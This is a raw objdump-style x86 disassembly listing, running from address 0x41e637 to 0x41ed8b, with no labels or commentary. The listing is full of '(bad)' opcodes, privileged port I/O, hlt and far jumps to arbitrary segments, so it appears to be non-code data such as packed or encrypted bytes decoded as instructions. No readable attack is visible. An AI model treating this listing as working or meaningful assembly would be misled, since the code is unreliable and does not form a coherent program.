  41e637:	mov    cs,WORD PTR [ecx-0x2c142cc9]
  41e63d:	mov    ecx,0xa7e79c4d
  41e642:	xor    BYTE PTR [eax],dh
  41e644:	fst    DWORD PTR [ebx-0x215e087]
  41e64a:	cld    
  41e64b:	sbb    BYTE PTR [eax+eiz*1],bl
  41e64e:	shl    DWORD PTR [ecx+ebx*2],cl
  41e651:	and    edx,DWORD PTR [edx+ebp*4-0xa351b15]
  41e658:	mov    dh,0x45
  41e65a:	js     0x41e689
  41e65c:	inc    edx
  41e65d:	inc    eax
  41e65e:	or     DWORD PTR [edx+0x59],esi
  41e661:	mov    WORD PTR [ebp-0x1e],?
  41e664:	cvtps2pd xmm4,QWORD PTR fs:[esi-0x514f782e]
  41e66c:	retf   0x1950
  41e66f:	xchg   ebx,eax
  41e670:	jnp    0x41e683
  41e672:	(bad)  
  41e673:	push   edi
  41e674:	mov    cl,0x66
  41e677:	jmp    0x41e667
  41e679:	retf   
  41e67a:	jp     0x41e62b
  41e67c:	out    0xe7,al
  41e67e:	mov    bh,0x9b
  41e680:	cmp    eax,0x92038708
  41e685:	clc    
  41e686:	(bad)  [ebx+0x3b]
  41e689:	das    
  41e68a:	ss ja  0x41e6b0
  41e68d:	sub    DWORD PTR [ebx-0x23],edx
  41e690:	test   al,0x3f
  41e692:	or     eax,0xf61370d3
  41e697:	shl    cl,cl
  41e699:	sub    eax,0xb418262a
  41e69e:	jne    0x41e624
  41e6a0:	xor    eax,0x97b7382c
  41e6a5:	mov    edi,0xc140beb4
  41e6aa:	add    DWORD PTR [ecx],ebp
  41e6ac:	stos   DWORD PTR es:[edi],eax
  41e6ad:	repnz (bad) 
  41e6af:	bound  ecx,QWORD PTR [edx-0xc]
  41e6b2:	sbb    ecx,DWORD PTR [ecx-0x62]
  41e6b5:	add    bh,BYTE PTR [ebx-0xcd0aeef]
  41e6bb:	daa    
  41e6bc:	jle    0x41e64e
  41e6be:	xchg   edi,eax
  41e6bf:	xor    eax,ebp
  41e6c1:	xchg   esi,eax
  41e6c2:	push   ecx
  41e6c3:	outs   dx,DWORD PTR ds:[esi]
  41e6c4:	in     eax,dx
  41e6c5:	push   0xd8a7c8d6
  41e6ca:	sbb    esp,DWORD PTR [ecx-0x6f]
  41e6cd:	or     DWORD PTR [ebx],edx
  41e6cf:	ins    DWORD PTR es:[edi],dx
  41e6d0:	and    eax,0x2c080f4a
  41e6d5:	mov    bl,0x6e
  41e6d7:	jb     0x41e740
  41e6d9:	or     edx,DWORD PTR [ebx-0x63]
  41e6dc:	gs out 0xba,eax
  41e6df:	inc    edx
  41e6e0:	mov    WORD PTR [ecx+esi*8+0x3b],ss
  41e6e4:	mov    eax,ds:0xcad37101
  41e6e9:	pop    esi
  41e6ea:	popf   
  41e6eb:	xor    esp,DWORD PTR ds:0x8c91e9b2
  41e6f1:	lahf   
  41e6f2:	out    0x56,al
  41e6f4:	cld    
  41e6f5:	mov    ah,0xdb
  41e6f7:	js     0x41e6e2
  41e6f9:	jno    0x41e739
  41e6fb:	loope  0x41e6e4
  41e6fd:	mov    bl,0x28
  41e6ff:	dec    eax
  41e700:	mov    ebx,0xddd2775
  41e705:	mov    eax,0x611e114b
  41e70a:	imul   edi,DWORD PTR [ecx],0xbb2c776d
  41e710:	add    cl,BYTE PTR [edi+0x5ea60c1b]
  41e716:	xchg   ebp,eax
  41e717:	stos   DWORD PTR es:[edi],eax
  41e718:	inc    ecx
  41e719:	cwde   
  41e71a:	sub    al,0xbf
  41e71c:	xchg   ebp,eax
  41e71d:	hlt    
  41e71e:	xchg   DWORD PTR [eax],ebp
  41e720:	xor    bh,BYTE PTR [ebx-0x646af019]
  41e726:	pushf  
  41e727:	(bad)  
  41e728:	sub    edi,DWORD PTR [eax]
  41e72a:	mov    cl,al
  41e72c:	jmp    0x6cce:0x758a880
  41e733:	(bad)  
  41e734:	jge    0x41e6b8
  41e736:	int3   
  41e737:	mov    cl,0x8f
  41e739:	push   ss
  41e73a:	lods   eax,DWORD PTR ds:[esi]
  41e73b:	xchg   BYTE PTR [ecx+0x4f],ah
  41e73e:	stos   DWORD PTR es:[edi],eax
  41e73f:	jno    0x41e76b
  41e741:	test   ecx,ebx
  41e743:	hlt    
  41e744:	retf   0x7d6
  41e747:	cmp    esi,esp
  41e749:	push   ecx
  41e74a:	sbb    eax,0x3012bfaa
  41e74f:	nop
  41e750:	and    eax,0x2f15b47d
  41e755:	jecxz  0x41e7a3
  41e757:	xor    eax,0xe76f28fc
  41e75c:	sbb    ecx,DWORD PTR [esi]
  41e75e:	and    bl,bh
  41e760:	ja     0x41e7d0
  41e762:	adc    DWORD PTR [ecx],edi
  41e764:	mov    cl,0x32
  41e766:	pop    ebx
  41e767:	ins    BYTE PTR es:[edi],dx
  41e768:	retf   0x6349
  41e76b:	adc    DWORD PTR [ebp-0x17a0c189],eax
  41e771:	ins    DWORD PTR es:[edi],dx
  41e772:	pop    edi
  41e773:	loopne 0x41e75a
  41e775:	retf   
  41e776:	not    BYTE PTR [eax+0x4c]
  41e779:	sub    ch,BYTE PTR [eax+0x646ac1f0]
  41e77f:	ja     0x41e7e6
  41e781:	dec    eax
  41e782:	xchg   esi,eax
  41e783:	jge    0x41e754
  41e785:	hlt    
  41e786:	pop    ebp
  41e787:	(bad)  
  41e789:	icebp  
  41e78a:	sub    dl,BYTE PTR [edx]
  41e78c:	scas   al,BYTE PTR es:[edi]
  41e78d:	icebp  
  41e78e:	pop    ecx
  41e78f:	(bad)  
  41e790:	jbe    0x41e80e
  41e792:	imul   eax,DWORD PTR [ebp+ebp*4-0x5e70f550],0xffffff92
  41e79a:	and    bl,bl
  41e79c:	adc    BYTE PTR [ebx-0x641bc336],dl
  41e7a2:	adc    BYTE PTR [edx-0x65],cl
  41e7a5:	mov    ebx,0xaf8cf0f8
  41e7ab:	jnp    0x41e767
  41e7ad:	cmp    bh,ah
  41e7af:	add    eax,0xaebbe880
  41e7b4:	jp     0x41e7fc
  41e7b6:	gs pushf 
  41e7b8:	add    BYTE PTR [ebp+0x76],0xa3
  41e7bc:	xchg   ebp,eax
  41e7bd:	cli    
  41e7be:	ror    BYTE PTR [eax],1
  41e7c0:	(bad)  
  41e7c1:	mov    BYTE PTR [ebx-0x1cfb0333],al
  41e7c7:	mov    dh,0x91
  41e7c9:	loopne 0x41e81f
  41e7cb:	mov    ebx,0x9ce22558
  41e7d0:	cli    
  41e7d1:	cmp    eax,0xa5f1b199
  41e7d6:	mov    WORD PTR [ebx+0x3d0573d5],ds
  41e7dc:	sub    esp,DWORD PTR [esi]
  41e7de:	mov    ecx,0xf77c0401
  41e7e3:	bound  esp,QWORD PTR ds:0x44d9be89
  41e7e9:	xchg   BYTE PTR [edx+0x18],dh
  41e7ec:	std    
  41e7ed:	pop    edi
  41e7ee:	push   esp
  41e7ef:	sub    ebp,DWORD PTR [edx+0x4109c9d7]
  41e7f5:	push   edi
  41e7f6:	mov    dh,BYTE PTR [ecx+0x41ce0d46]
  41e7fc:	jno    0x41e848
  41e7fe:	push   0xff39088c
  41e803:	xchg   DWORD PTR [edx-0x26d5e5e4],ecx
  41e809:	push   cs
  41e80a:	add    al,0x8a
  41e80c:	add    cl,BYTE PTR [eax]
  41e80e:	xchg   edx,eax
  41e80f:	aas    
  41e810:	mov    ch,0xad
  41e812:	out    0xf8,al
  41e814:	mov    ch,0xb8
  41e816:	sti    
  41e817:	mov    BYTE PTR [ebp-0x60],al
  41e81a:	fs push edi
  41e81c:	pop    ecx
  41e81d:	lods   eax,DWORD PTR ds:[esi]
  41e81e:	inc    ecx
  41e81f:	fwait
  41e820:	mov    gs,WORD PTR [eax]
  41e822:	xor    al,BYTE PTR gs:[edx-0x4c]
  41e826:	shl    DWORD PTR [eax+0x62],cl
  41e829:	fs jo  0x41e872
  41e82c:	das    
  41e82d:	sub    BYTE PTR [ecx+ebp*4-0x15cb7b7d],ch
  41e834:	fst    DWORD PTR [edi]
  41e836:	dec    eax
  41e837:	sti    
  41e838:	jne    0x41e862
  41e83a:	fmul   DWORD PTR [ebp+0x6c]
  41e83d:	inc    ecx
  41e83e:	jmp    0x4e396c67
  41e843:	jl     0x41e890
  41e845:	loopne 0x41e84d
  41e847:	sbb    DWORD PTR [ebx],esp
  41e849:	stos   DWORD PTR es:[edi],eax
  41e84a:	imul   eax,DWORD PTR [ebx],0x9
  41e84d:	jae    0x41e83a
  41e84f:	mov    ah,0xaa
  41e851:	sbb    dl,BYTE PTR [ebx-0x61]
  41e854:	cmp    dh,BYTE PTR [ebx+eax*1]
  41e857:	mov    ebx,DWORD PTR [eax]
  41e859:	jnp    0x41e834
  41e85b:	aas    
  41e85c:	lods   eax,DWORD PTR ds:[esi]
  41e85d:	xchg   ebx,eax
  41e85e:	cli    
  41e85f:	pop    edx
  41e860:	stos   DWORD PTR es:[edi],eax
  41e861:	aad    0x4b
  41e863:	fwait
  41e864:	mov    bh,0x31
  41e866:	dec    esp
  41e867:	arpl   WORD PTR [ebx+0x56],bp
  41e86a:	loopne 0x41e834
  41e86c:	or     al,0xf5
  41e86e:	pop    esp
  41e86f:	ret    0x13a7
  41e872:	dec    eax
  41e873:	push   esp
  41e874:	out    dx,eax
  41e875:	lock sbb eax,0xc295c640
  41e87b:	pop    edx
  41e87c:	(bad)  
  41e87d:	leave  
  41e87e:	and    eax,0x7262e9a0
  41e883:	jge    0x41e8f7
  41e885:	sub    al,0xb
  41e887:	inc    ebp
  41e888:	shl    edx,1
  41e88a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e88b:	dec    ecx
  41e88c:	iret   
  41e88d:	sub    DWORD PTR [ebx+0xd],ebx
  41e890:	es inc ebp
  41e892:	mov    eax,0xf9679a94
  41e897:	icebp  
  41e898:	mov    esi,0x44691cea
  41e89d:	sbb    DWORD PTR [ecx],0x1b28e970
  41e8a3:	mov    ah,0x68
  41e8a5:	enter  0xfe6f,0xce
  41e8a9:	cmp    edi,DWORD PTR [edi+0x176e65b2]
  41e8af:	and    al,0xdb
  41e8b1:	xchg   edx,eax
  41e8b2:	inc    edx
  41e8b3:	retf   
  41e8b4:	mov    edi,DWORD PTR [ecx-0x5511dd50]
  41e8ba:	jmp    0xfcc1:0x78cbc0fb
  41e8c1:	out    dx,eax
  41e8c2:	push   es
  41e8c3:	xor    BYTE PTR [esi],0x66
  41e8c6:	mov    ebp,0x8ffdc75d
  41e8cb:	xor    ebx,edx
  41e8cd:	or     BYTE PTR [eax+0x60],bh
  41e8d0:	mov    WORD PTR [edx+ebp*8],?
  41e8d3:	lods   al,BYTE PTR ds:[esi]
  41e8d4:	loope  0x41e91b
  41e8d6:	daa    
  41e8d7:	lahf   
  41e8d8:	mov    eax,ds:0xfa6772b9
  41e8dd:	(bad)  
  41e8df:	mov    al,BYTE PTR [ebx-0x7e6a1700]
  41e8e5:	xchg   esi,eax
  41e8e6:	out    dx,al
  41e8e7:	and    ebp,DWORD PTR [ebp-0x2a]
  41e8ea:	mov    ch,0x55
  41e8ec:	or     bh,bh
  41e8ee:	xchg   BYTE PTR [edi-0x2fefdafb],al
  41e8f4:	call   0xfe31:0xda0d772a
  41e8fb:	and    ecx,esp
  41e8fd:	(bad)  
  41e8fe:	jb     0x41e886
  41e900:	retf   
  41e901:	pop    edx
  41e902:	and    eax,0x95729dd9
  41e907:	loop   0x41e966
  41e909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e90a:	pop    ecx
  41e90b:	(bad)  
  41e90c:	jp     0x41e8d3
  41e90e:	mov    cl,0xda
  41e910:	scas   al,BYTE PTR es:[edi]
  41e911:	push   es
  41e912:	sub    ebx,DWORD PTR [esi]
  41e914:	fdivr  DWORD PTR [eax+0x67]
  41e917:	xchg   ecx,eax
  41e918:	pop    ebp
  41e919:	les    eax,FWORD PTR [esp+edx*8+0x63]
  41e91d:	(bad)  
  41e91f:	test   al,0xdb
  41e921:	pop    ebx
  41e922:	dec    esp
  41e923:	jnp    0x41e93e
  41e925:	pusha  
  41e926:	pop    eax
  41e927:	ret    0x5ff9
  41e92a:	ficomp WORD PTR [edi]
  41e92c:	mov    ebp,DWORD PTR [ecx+0x76c1397]
  41e932:	pop    esi
  41e933:	cdq    
  41e934:	cmp    ecx,DWORD PTR [ebp+0x18]
  41e937:	mov    ecx,0x60900f77
  41e93c:	fbstp  TBYTE PTR [ecx]
  41e93e:	std    
  41e93f:	sar    BYTE PTR [ebp-0x77],0x27
  41e943:	cs in  al,dx
  41e945:	sbb    ch,BYTE PTR [eax]
  41e947:	add    edx,DWORD PTR [edi]
  41e949:	adc    eax,0xd27c1501
  41e94e:	or     ch,BYTE PTR [esi-0x4c]
  41e951:	pop    ds
  41e952:	cli    
  41e953:	push   ss
  41e954:	adc    DWORD PTR [edx],ebp
  41e956:	pushf  
  41e957:	adc    dh,bh
  41e959:	mov    dl,BYTE PTR [edi-0x72]
  41e95c:	retf   0xc634
  41e95f:	push   esp
  41e960:	sar    BYTE PTR [esi+0x4b],1
  41e963:	popa   
  41e964:	jecxz  0x41e9d6
  41e966:	mov    esi,0xb8bd11d1
  41e96b:	xor    eax,0x3c4516ff
  41e970:	or     al,0xc2
  41e972:	je     0x41e975
  41e974:	mov    dh,0x1a
  41e976:	imul   ecx,esi,0xc
  41e979:	iret   
  41e97a:	mov    edi,eax
  41e97c:	xor    esi,DWORD PTR [ebx]
  41e97e:	out    0x95,eax
  41e980:	loop   0x41e909
  41e982:	push   eax
  41e983:	addr16 inc ebx
  41e985:	sbb    eax,esi
  41e987:	or     BYTE PTR [eax],0x5c
  41e98a:	inc    edx
  41e98b:	rcr    BYTE PTR [eax+0x17b91dfe],0x32
  41e992:	sbb    BYTE PTR [edi+eax*2],bh
  41e995:	sbb    DWORD PTR [ecx+0x3],0xcc427663
  41e99c:	scas   eax,DWORD PTR es:[edi]
  41e99d:	xor    DWORD PTR [esi],0x5e
  41e9a0:	test   DWORD PTR [esi],edi
  41e9a2:	xchg   ebx,eax
  41e9a3:	icebp  
  41e9a4:	addr16 add al,0x2f
  41e9a7:	fisttp DWORD PTR [eax-0x6dbe2e0c]
  41e9ad:	outs   dx,DWORD PTR ds:[esi]
  41e9ae:	jmp    0x41e9c6
  41e9b0:	sub    eax,0xfff5bb0d
  41e9b5:	in     al,dx
  41e9b6:	push   eax
  41e9b7:	pop    ebp
  41e9b8:	pop    esp
  41e9b9:	leave  
  41e9ba:	mov    esp,es
  41e9bc:	mov    al,0x2d
  41e9be:	mov    edi,esi
  41e9c0:	dec    ebx
  41e9c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9c2:	xor    al,0xa7
  41e9c4:	sbb    eax,0x7b042225
  41e9c9:	jmp    0xbe3bb177
  41e9ce:	xchg   esp,eax
  41e9cf:	jg     0x41e958
  41e9d1:	add    ecx,edi
  41e9d3:	mov    cl,0x5d
  41e9d5:	jg     0x41ea14
  41e9d7:	sbb    esi,ebp
  41e9d9:	(bad)  [edx+0xe]
  41e9dc:	inc    esi
  41e9dd:	loop   0x41e9df
  41e9df:	xchg   BYTE PTR [eax+0xa],al
  41e9e2:	mov    WORD PTR [edi+0x8de6cf5],gs
  41e9e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9e9:	loop   0x41ea0b
  41e9eb:	call   0x741563a8
  41e9f0:	push   ebp
  41e9f1:	pop    eax
  41e9f2:	(bad)  
  41e9f3:	pushf  
  41e9f4:	sub    al,0xea
  41e9f6:	cs or  edi,DWORD PTR es:[esi]
  41e9fa:	mov    ds:0xa4c42ad1,al
  41e9ff:	and    BYTE PTR [ebp+0x51],dl
  41ea02:	sub    eax,0x99f76034
  41ea07:	ss call 0x440f0d1a
  41ea0d:	lock mov ch,0x1f
  41ea10:	div    DWORD PTR fs:[eax+0x1b]
  41ea14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea15:	in     eax,0x86
  41ea17:	jns    0x41ea7d
  41ea19:	xor    dh,ch
  41ea1b:	ficomp WORD PTR [ebp-0x46]
  41ea1e:	mov    edi,0x1902e2d8
  41ea23:	mov    ss,WORD PTR [eax-0x3633fa37]
  41ea29:	retf   0xb664
  41ea2c:	dec    esp
  41ea2d:	adc    BYTE PTR [ecx+0x4aff25e4],ah
  41ea33:	mov    ebx,DWORD PTR ds:0x2390e5a8
  41ea39:	test   ebx,0xe47225cd
  41ea3f:	dec    edi
  41ea40:	or     al,0x9d
  41ea42:	xor    DWORD PTR [ebx+0x712bcbc4],esp
  41ea48:	sub    al,0x1a
  41ea4a:	add    BYTE PTR [edi],ah
  41ea4c:	and    eax,0xb3566bf
  41ea51:	imul   edx,DWORD PTR [ebx+0x36],0xffffffc3
  41ea55:	mov    ds:0x699de598,al
  41ea5a:	and    eax,0xee69d777
  41ea5f:	mov    ch,0xa5
  41ea61:	mov    bl,al
  41ea63:	or     esi,eax
  41ea65:	lods   eax,DWORD PTR ds:[esi]
  41ea66:	fwait
  41ea67:	jbe    0x41ea1e
  41ea69:	xor    BYTE PTR [ecx+0x2e],dl
  41ea6c:	xchg   ebp,eax
  41ea6d:	retf   
  41ea6e:	mov    bl,0x4
  41ea70:	aad    0x26
  41ea72:	idiv   BYTE PTR [ecx]
  41ea74:	mov    esp,0x9947f8da
  41ea79:	push   cs
  41ea7a:	xor    ch,BYTE PTR [ebp+0x7c]
  41ea7d:	jns    0x41ea23
  41ea7f:	mov    al,ds:0xb8dd4bb9
  41ea84:	stc    
  41ea85:	mov    edx,0x607a17eb
  41ea8a:	lods   al,BYTE PTR ds:[esi]
  41ea8b:	or     BYTE PTR [edi+0x699c033],al
  41ea91:	cmp    ch,BYTE PTR [ebx+0x72]
  41ea94:	xor    eax,0x7bd42eb5
  41ea99:	inc    ebp
  41ea9a:	aaa    
  41ea9b:	push   ebx
  41ea9c:	(bad)  
  41ea9e:	es cwde 
  41eaa0:	jbe    0x41ead1
  41eaa2:	test   al,0x8
  41eaa4:	jnp    0x41ea38
  41eaa6:	mov    esp,0xe8a8501e
  41eaab:	xor    BYTE PTR [edi+0x6b9af3ce],ah
  41eab1:	jns    0x41ea47
  41eab3:	enter  0x213b,0x7f
  41eab7:	adc    al,0xe4
  41eab9:	mov    ch,0x2f
  41eabb:	js     0x41ea53
  41eabd:	mov    esp,0xbf7fd959
  41eac2:	mov    cl,0xf6
  41eac4:	add    DWORD PTR [ebp-0x6a],0xffffffc6
  41eac8:	(bad)  
  41eaca:	xchg   ebp,ebp
  41eacc:	imul   ebx,DWORD PTR ds:0x20279bf,0xb4d025d4
  41ead6:	mov    edi,0x1640e7f2
  41eadb:	das    
  41eadc:	jmp    0x1ef29521
  41eae1:	(bad)  
  41eae2:	out    dx,eax
  41eae3:	call   0xbbac:0x46a4162a
  41eaea:	leave  
  41eaeb:	pop    es
  41eaec:	pop    ds
  41eaed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaee:	cmp    edx,DWORD PTR [edi]
  41eaf0:	add    ebx,esp
  41eaf2:	sub    DWORD PTR [edi],0x1182d26b
  41eaf8:	mov    ecx,0x360150fe
  41eafd:	jle    0x41eb44
  41eaff:	fild   QWORD PTR [ebx+0x15423202]
  41eb05:	xchg   edi,eax
  41eb06:	inc    ebx
  41eb07:	cmp    DWORD PTR [ebx-0x3ae4a74],esi
  41eb0d:	pop    esi
  41eb0e:	inc    ebx
  41eb0f:	pop    ss
  41eb10:	popa   
  41eb11:	or     cl,BYTE PTR [ecx]
  41eb13:	jnp    0x41eb55
  41eb15:	into   
  41eb16:	out    0x29,al
  41eb18:	cmp    dh,cl
  41eb1a:	jns    0x41eb32
  41eb1c:	add    DWORD PTR [esi+0x53],eax
  41eb1f:	mov    ch,BYTE PTR [esi+0x1287cbc0]
  41eb25:	mov    esi,0xd9707239
  41eb2a:	mov    esp,0x636f4bf1
  41eb2f:	ss jmp 0x41eb7e
  41eb32:	imul   eax,edx,0xffffffae
  41eb35:	xchg   esp,eax
  41eb36:	(bad)  
  41eb38:	xor    al,0xae
  41eb3a:	aam    0xd4
  41eb3c:	pop    ss
  41eb3d:	adc    bh,BYTE PTR ds:0x4fb71b5f
  41eb43:	and    ah,bh
  41eb45:	retf   0xc87d
  41eb48:	iret   
  41eb49:	int3   
  41eb4a:	ins    BYTE PTR es:[edi],dx
  41eb4b:	pusha  
  41eb4c:	outs   dx,BYTE PTR ds:[esi]
  41eb4d:	xchg   edx,eax
  41eb4e:	aas    
  41eb4f:	retf   
  41eb50:	call   FWORD PTR [edi-0xf]
  41eb53:	into   
  41eb54:	or     bh,BYTE PTR [esi+ebp*4+0x9]
  41eb58:	mov    bl,0x1d
  41eb5a:	add    ebp,ecx
  41eb5c:	cmp    al,0xcb
  41eb5e:	pop    es
  41eb5f:	and    eax,0x43283160
  41eb64:	das    
  41eb65:	fbld   TBYTE PTR [edx]
  41eb67:	ret    0x8705
  41eb6a:	inc    edi
  41eb6b:	shl    DWORD PTR [ecx+eax*8-0x4f],1
  41eb6f:	adc    DWORD PTR [edx],0x4a
  41eb72:	mov    al,0x2e
  41eb74:	xor    bh,al
  41eb76:	inc    edx
  41eb77:	jle    0x41eb6e
  41eb79:	sahf   
  41eb7a:	add    DWORD PTR [esi-0x2ea1d42a],edi
  41eb80:	cmp    eax,0xd2c08e76
  41eb85:	cmp    al,0xb3
  41eb87:	push   edi
  41eb88:	ror    BYTE PTR [ebp-0x234297d2],0xcd
  41eb8f:	pushf  
  41eb90:	xor    BYTE PTR [eax+0x1],ah
  41eb93:	daa    
  41eb94:	and    al,BYTE PTR [ecx]
  41eb96:	ds lahf 
  41eb98:	cmp    dh,ah
  41eb9a:	cld    
  41eb9b:	loop   0x41ebdf
  41eb9d:	dec    edi
  41eb9e:	call   0xf84ba596
  41eba3:	pop    ds
  41eba4:	adc    eax,0xcd20b2e5
  41eba9:	jmp    0xa4f72dd2
  41ebae:	ds clc 
  41ebb0:	mov    cl,0xff
  41ebb2:	adc    esi,eax
  41ebb4:	pop    ecx
  41ebb5:	das    
  41ebb6:	cmp    al,0x10
  41ebb8:	gs dec eax
  41ebba:	test   DWORD PTR [ebp-0x2d767e93],ebp
  41ebc0:	mov    ah,0x80
  41ebc2:	fst    QWORD PTR [edi+0x3f]
  41ebc5:	mov    edx,ebp
  41ebc7:	idiv   al
  41ebc9:	add    al,0x71
  41ebcb:	xchg   BYTE PTR [ebp-0x7ebdc6b9],dl
  41ebd1:	(bad)  
  41ebd2:	or     al,0x43
  41ebd4:	(bad)  
  41ebd5:	jne    0x41eb9b
  41ebd7:	dec    DWORD PTR [ebx+ebp*1]
  41ebda:	mov    al,0xe4
  41ebdc:	pop    es
  41ebdd:	dec    ebp
  41ebde:	mov    ebx,0xf9cbf3d3
  41ebe3:	and    eax,0xef9c5fe1
  41ebe8:	sub    ah,BYTE PTR [edx+0x79a56422]
  41ebee:	add    edi,DWORD PTR [ebx+0x19bd2248]
  41ebf4:	inc    esp
  41ebf5:	hlt    
  41ebf6:	pop    edi
  41ebf7:	into   
  41ebf8:	xchg   esi,eax
  41ebf9:	inc    edx
  41ebfa:	(bad)  
  41ebfb:	adc    DWORD PTR [eax+0x2f63e8fb],ebx
  41ec01:	add    eax,ebp
  41ec03:	xchg   edi,eax
  41ec04:	adc    eax,DWORD PTR [ecx-0x682dc0b8]
  41ec0a:	popf   
  41ec0b:	xor    BYTE PTR [ecx-0x4964ece],cl
  41ec11:	into   
  41ec12:	dec    edx
  41ec13:	dec    edi
  41ec14:	jecxz  0x41ec90
  41ec16:	lds    edx,FWORD PTR [edi]
  41ec18:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec1a:	or     BYTE PTR [esi+0x35],dh
  41ec1d:	xor    eax,0xd12d3719
  41ec22:	das    
  41ec23:	lock xchg edx,eax
  41ec25:	sbb    ebp,DWORD PTR [edi+0x5e]
  41ec28:	out    0xa0,al
  41ec2a:	fimul  WORD PTR [edx-0x4]
  41ec2d:	push   esp
  41ec2e:	push   es
  41ec2f:	xlat   BYTE PTR ds:[ebx]
  41ec30:	call   0x2014:0xd66c4a45
  41ec37:	aad    0xc3
  41ec39:	and    al,0x9d
  41ec3b:	pop    ss
  41ec3c:	shr    BYTE PTR [esi+eiz*2],cl
  41ec3f:	push   edi
  41ec40:	push   0x57
  41ec42:	inc    ebp
  41ec43:	cli    
  41ec44:	push   edi
  41ec45:	add    ch,0xbe
  41ec48:	repz clc 
  41ec4a:	jnp    0x41ebd1
  41ec4c:	jae    0x41ebef
  41ec4e:	pop    ds
  41ec4f:	test   DWORD PTR [ebp+0x3c],esi
  41ec52:	out    0xec,al
  41ec54:	jnp    0x41ec21
  41ec56:	add    esp,ebp
  41ec58:	popa   
  41ec59:	jbe    0x41ec18
  41ec5b:	push   esi
  41ec5c:	add    DWORD PTR [ecx-0x5ae47224],eax
  41ec62:	out    dx,al
  41ec63:	fadd   DWORD PTR [ecx]
  41ec65:	jns    0x41ec88
  41ec67:	hlt    
  41ec68:	xlat   BYTE PTR ds:[ebx]
  41ec69:	out    dx,eax
  41ec6a:	(bad)  
  41ec6b:	mov    eax,0x7f1ca93f
  41ec70:	out    0x1a,eax
  41ec72:	retf   0xa159
  41ec75:	mov    dh,0x92
  41ec77:	fild   QWORD PTR [edi+edx*4+0x593d76b4]
  41ec7e:	cmp    DWORD PTR [ecx+0x11],eax
  41ec81:	int    0xdd
  41ec83:	ja     0x41ec40
  41ec85:	sbb    eax,0x34e6b57c
  41ec8a:	leave  
  41ec8b:	shl    DWORD PTR [esi],1
  41ec8d:	sahf   
  41ec8e:	ret    
  41ec8f:	and    ecx,DWORD PTR [ecx]
  41ec91:	(bad)  
  41ec92:	leave  
  41ec93:	pop    es
  41ec94:	add    cl,dl
  41ec96:	jge    0x41ec48
  41ec98:	cwde   
  41ec99:	cmc    
  41ec9a:	aad    0xa7
  41ec9c:	mov    DWORD PTR [edi-0x61],edi
  41ec9f:	out    0x31,al
  41eca1:	out    0x55,al
  41eca3:	mov    esi,0x633d8063
  41eca8:	push   edi
  41eca9:	sbb    eax,0x1e560fb8
  41ecae:	rol    bh,1
  41ecb0:	or     DWORD PTR [edx],edi
  41ecb2:	js     0x41eca4
  41ecb4:	inc    ebx
  41ecb5:	test   al,0x61
  41ecb7:	clc    
  41ecb8:	fimul  DWORD PTR [ecx+0x26]
  41ecbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecbc:	add    dh,al
  41ecbe:	sub    eax,0x6e35135e
  41ecc3:	mov    dl,BYTE PTR [edx-0x58e2f05f]
  41ecc9:	(bad)  
  41ecca:	stc    
  41eccb:	loopne 0x41eca6
  41eccd:	xchg   edi,eax
  41ecce:	mov    gs,WORD PTR [ebx-0x72a6eabc]
  41ecd4:	add    al,0x1a
  41ecd6:	inc    ebx
  41ecd7:	add    BYTE PTR [ebx-0x320075d7],ah
  41ecdd:	mov    ebp,0xe148eaa9
  41ece2:	test   DWORD PTR [eax+0x79],ebp
  41ece5:	pop    eax
  41ece6:	out    dx,eax
  41ece7:	pop    ds
  41ece8:	push   edi
  41ece9:	hlt    
  41ecea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eceb:	push   0xffffffb6
  41eced:	sbb    BYTE PTR [ecx-0x5b],bh
  41ecf0:	sbb    dh,BYTE PTR ds:0x5015fa4a
  41ecf6:	aam    0x22
  41ecf8:	repnz add ebx,DWORD PTR [ecx+ecx*1]
  41ecfc:	push   eax
  41ecfd:	out    0xae,eax
  41ecff:	mov    al,0x97
  41ed01:	je     0x41ecc7
  41ed03:	es push es
  41ed05:	pop    edi
  41ed06:	pop    ebx
  41ed08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed09:	fs push eax
  41ed0b:	fnstcw WORD PTR [edi+0x48e62dde]
  41ed11:	or     al,0x88
  41ed13:	div    BYTE PTR [ebx]
  41ed15:	fs loopne 0x41ecf6
  41ed18:	out    0x96,eax
  41ed1a:	sub    al,0x35
  41ed1c:	dec    edi
  41ed1d:	pop    edx
  41ed1e:	call   0x2f355c24
  41ed23:	paddw  mm7,QWORD PTR [edx]
  41ed26:	enter  0x7586,0x4a
  41ed2a:	mov    edx,0xf3f303da
  41ed2f:	scas   al,BYTE PTR es:[edi]
  41ed30:	adc    eax,DWORD PTR [ecx]
  41ed32:	shr    BYTE PTR [edx-0x69],0xdc
  41ed36:	(bad)  
  41ed38:	jbe    0x41ed06
  41ed3a:	addr16 sbb ebx,ebx
  41ed3d:	sub    al,BYTE PTR [ebx-0x51]
  41ed40:	push   0xe7b269d7
  41ed45:	sbb    dh,BYTE PTR [eax+0x62]
  41ed48:	out    dx,eax
  41ed49:	adc    eax,0xc5a72534
  41ed4e:	add    bh,al
  41ed50:	or     BYTE PTR [ecx+ebp*8-0x72c5e4c3],al
  41ed57:	stc    
  41ed58:	sub    cl,BYTE PTR [edi+esi*8-0x75]
  41ed5c:	mov    bl,0x46
  41ed5e:	iret   
  41ed5f:	xchg   ebx,eax
  41ed60:	dec    ecx
  41ed61:	in     al,0xa3
  41ed63:	rol    DWORD PTR [esi],cl
  41ed65:	mov    edx,0x14c36dfa
  41ed6a:	jne    0x41ed91
  41ed6c:	test   al,0xa8
  41ed6e:	jbe    0x41ecf3
  41ed70:	sub    edx,DWORD PTR [ebp+0x55d5de3]
  41ed76:	xchg   esi,eax
  41ed77:	ins    DWORD PTR es:[edi],dx
  41ed78:	sub    DWORD PTR [ecx+0x44],0x746aa8db
  41ed7f:	cmp    DWORD PTR [edi-0x32],0x4d20ddbe
  41ed86:	in     eax,0x5b
  41ed88:	ins    BYTE PTR es:[edi],dx
  41ed89:	dec    eax
  41ed8a:	out    dx,al
  41ed8b:	xor    eax,0x53335a23
